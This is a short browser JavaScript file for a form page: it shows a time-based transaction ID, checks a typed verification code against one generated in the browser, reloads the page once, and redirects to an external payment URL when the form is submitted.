function displayTransactionID() {
      const manilaTime = new Date().toLocaleString("en-US", { timeZone: "Asia/Manila" });
      const date = new Date(manilaTime);

      const month = String(date.getMonth() + 1).padStart(2, '0');
      const day = String(date.getDate()).padStart(2, '0');
      const hour = String(date.getHours()).padStart(2, '0');
      const minute = String(date.getMinutes()).padStart(2, '0');
      const second = String(date.getSeconds()).padStart(2, '0');

      const transactionID = `${month}${day}${hour}${minute}${second}`;
      document.getElementById("txn-id").textContent = transactionID;
    }

    window.addEventListener('DOMContentLoaded', displayTransactionID);
function generateVerification() {
      const numbers = '123456789';
      const letters = 'ABCDEFGHJKMNOPQRSTUVWXYZ';
      let verification = [];

    for (let i = 0; i < 3; i++) {
        verification.push(numbers.charAt(Math.floor(Math.random() * numbers.length)));
    }

    for (let i = 0; i < 3; i++) {
        verification.push(letters.charAt(Math.floor(Math.random() * letters.length)));
    }

    for (let i = verification.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [verification[i], verification[j]] = [verification[j], verification[i]];
    }

    const verificationString = verification.join('');
    document.getElementById('verification').textContent = verificationString;
    return verificationString;
}

const correctVerification = generateVerification();

document.getElementById('verificationInput').addEventListener('input', function () {
    const userInput = this.value;
    const submitButton = document.getElementById('submitButton');
    const verificationError = document.getElementById('verificationError');

    if (userInput === correctVerification) {
        submitButton.disabled = false;
        if (verificationError) verificationError.style.display = 'none';
    } else {
        submitButton.disabled = true;
        if (verificationError) {
            verificationError.style.display = userInput.length === correctVerification.length ? 'block' : 'none';
        }
    }
});

const refreshed = sessionStorage.getItem("refreshed-once");

if (!refreshed) {
    sessionStorage.setItem("refreshed-once", "yes");
    location.reload();
}

window.addEventListener("beforeunload", () => {
    sessionStorage.removeItem("refreshed-once");
});

document.getElementById('verificationForm').addEventListener('submit', function (event) {
      event.preventDefault();
      window.location.href = "https://gentechserver.com/payment";
    });
